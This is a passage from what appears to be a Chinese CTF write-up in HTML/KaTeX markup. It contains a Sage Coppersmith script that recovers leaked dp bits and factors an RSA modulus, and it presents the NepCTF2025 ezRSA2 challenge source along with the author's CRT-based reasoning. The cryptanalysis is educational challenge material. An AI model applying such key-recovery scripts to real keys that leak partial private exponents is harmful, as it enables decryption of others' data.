stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*(dp\_high+x)+k-1\equiv 0(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span><br />因为这里<code>e</code>太大了，我们打不了<a href="https://www.cnblogs.com/vconlln/p/17066500.html">一元copper</a>，那就直接打<strong>二元copper</strong></p><p>奇怪的是，<code>m</code>代表移位位数，<code>d</code>代表多项式的最高次幂，但这里只能为3才能跑出<code>flag</code></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mi>e</mi><mo>∗</mo><mi>d</mi><mi>p</mi></mrow></msup><mo>≡</mo><mn>2</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">2^{e*dp}\equiv 2(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">p</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mi>G</mi><mi>C</mi><mi>D</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mrow><mi>e</mi><mo>∗</mo><mi>d</mi><mi>p</mi></mrow></msup><mo>−</mo><mn>2</mn><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p=GCD(2^{e*dp}-2,n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0991079999999998em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">p</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">e = <span class="number">1915595112993511209389477484497</span></span><br><span class="line">n = <span class="number">12058282950596489853905564906853910576358068658769384729579819801721022283769030646360180235232443948894906791062870193314816321865741998147649422414431603039299616924238070704766273248012723702232534461910351418959616424998310622248291946154911467931964165973880496792299684212854214808779137819098357856373383337861864983040851365040402759759347175336660743115085194245075677724908400670513472707204162448675189436121439485901172477676082718531655089758822272217352755724670977397896215535981617949681898003148122723643223872440304852939317937912373577272644460885574430666002498233608150431820264832747326321450951</span></span><br><span class="line">c = <span class="number">5408361909232088411927098437148101161537011991636129516591281515719880372902772811801912955227544956928232819204513431590526561344301881618680646725398384396780493500649993257687034790300731922993696656726802653808160527651979428360536351980573727547243033796256983447267916371027899350378727589926205722216229710593828255704443872984334145124355391164297338618851078271620401852146006797653957299047860900048265940437555113706268887718422744645438627302494160620008862694047022773311552492738928266138774813855752781598514642890074854185464896060598268009621985230517465300289580941739719020511078726263797913582399</span></span><br><span class="line">hint = <span class="number">10818795142327948869191775315599184514916408553660572070587057895748317442312635789407391509205135808872509326739583930473478654752295542349813847128992385262182771143444612586369461112374487380427668276692719788567075889405245844775441364204657098142930</span></span><br><span class="line">leak = hint &lt;&lt; <span class="number">180</span></span><br><span class="line">PR.&lt;x,y&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">f = e*(leak + x) + y -<span class="number">1</span></span><br><span class="line">res = small_roots(f, (<span class="number">2</span>^<span class="number">180</span>,<span class="number">2</span>^e.bit_length()),m=<span class="number">1</span>,d=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> res:</span><br><span class="line">    dp = leak + root[<span class="number">0</span>]</span><br><span class="line">    p = GCD(<span class="built_in">pow</span>(<span class="number">2</span>, e*dp, n) -<span class="number">2</span>, n)</span><br><span class="line">    q = n // p</span><br><span class="line">    d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m).decode())</span><br></pre></td></tr></table></figure><h1 id="nepctf2025-ezrsa2"><a class="markdownIt-Anchor" href="#nepctf2025-ezrsa2"></a> NepCTF2025 - ezRSA2</h1><blockquote><p>Easy RSA, easy strategy. No need to brute force.<br />Perhaps it’s easier than ezRSA in NepCTF 2024.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime, getRandomNBitInteger, GCD, inverse, long_to_bytes, bytes_to_long, sieve_base</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_parameters</span>(<span class="params">gamma=<span class="number">0.33</span>, beta=<span class="number">0.33</span></span>):</span><br><span class="line">    p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">    N = p*q</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d = getRandomNBitInteger(<span class="built_in">int</span>(<span class="number">2048</span>*beta))</span><br><span class="line">        <span class="keyword">if</span> GCD(d, phi) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    e = inverse(d, phi)</span><br><span class="line">    </span><br><span class="line">    hints = []</span><br><span class="line">    M = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(sieve_base)):</span><br><span class="line">        li = sieve_base[i]</span><br><span class="line">        hints.append(d%li)</span><br><span class="line">        M *= li</span><br><span class="line">        <span class="keyword">if</span> M.bit_length() &gt;= <span class="number">1024</span>*gamma:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> e, N, hints</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    e,N,hints = gen_parameters()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;e=<span class="subst">&#123;<span class="built_in">hex</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;N=<span class="subst">&#123;<span class="built_in">hex</span>(N)&#125;</span>\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;hints=<span class="subst">&#123;hints&#125;</span>\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    flag_prefix = <span class="string">b&#x27;NepCTF&#123;&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> flag.startswith(flag_prefix)</span><br><span class="line">    <span class="keyword">assert</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    pt = bytes_to_long(flag[<span class="built_in">len</span>(flag_prefix):-<span class="number">1</span>])</span><br><span class="line">    ct = <span class="built_in">pow</span>(pt, e, N)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;ct=<span class="subst">&#123;<span class="built_in">hex</span>(ct)&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e=0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line"><span class="string">N=0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">hints=[1, 3, 0, 3, 9, 16, 10, 14, 5, 11, 21, 18, 30, 30, 38, 2, 20, 62, 66, 1, 22, 56, 41, 13, 78, 59, 51, 6, 57, 117, 73, 75, 96, 112, 50, 93, 158, 97, 146, 8, 65, 96, 186, 161, 90, 131, 46, 32, 140, 133, 50, 43, 151, 234]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ct=0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>这里一下子就可以看到<code>e</code>很大并且接近<code>N</code>，但发现<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>≈</mo><msup><mi>N</mi><mn>0.33</mn></msup></mrow><annotation encoding="application/x-tex">d\approx N^{0.33}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">.</span><span class="mord mtight">3</span><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span></span>，大于<strong>boneh durfee</strong> <code>0.292</code>的<strong>上界</strong>，不适用</p><p>然，本题的<code>hints.append(d%li)</code>可以通过<strong>中国剩余定理CRT</strong>求解出<code>d</code>的<strong>低位</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo>≡</mo><mi>d</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>M</mi></mrow><annotation encoding="application/x-tex">d_{low}\equiv d\ mod\ M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><msub><mi>k</mi><mn>1</mn></msub><mi>M</mi><mo>+</mo><msub><mi>d</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub></mrow><annotation encoding="application/x-tex">d=k_{1}M+d_{low}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>正常做这种<code>d</code>相关的题目的思路都可以借助下面这条公式，进行展开，尝试<code>copper</code>或者<strong>构造格</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>d</mi><mo>≡</mo><mn>1</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ed\equiv 1\ mod\ \phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>d</mi><mo>=</mo><mi>k</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>N</mi><mo>−</mo><mi>p</mi><mo>−</mo><mi>q</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">ed=k*(N-p-q+1)+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p>因为周末也要<strong>值班</strong>。。。还是<strong>夜班</strong>，加上又不是很想碰<code>CTF</code>，所以当时就想着能不能找到<code>boneh durfee</code>的优化算法，把上界调高，偷个懒，直接梭()<br />很可惜没找到(但赛后群友有说找到的，orz)，然后困了，不想做，等赛后再看看</p><p>到上面这一步，有两种思路</p><h2 id="思路一"><a class="markdownIt-Anchor" href="#思路一"></a> 思路一</h2><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>∗</mo><msub><mi>d</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo>+</mo><mi>e</mi><mo>∗</mo><msub><mi>k</mi><mn>1</mn></msub><mi>M</mi><mo>−</mo><mn>1</mn><mo>=</mo><msub><mi>k</mi><mn>2</mn></msub><mo>∗</mo><mo stretchy="false">(</mo><mi>N</mi><mo>−</mo><mi>p</mi><mo>−</mo><mi>q</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*d_{low}+e*k_{1}M-1=k_{2}*(N-p-q+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" 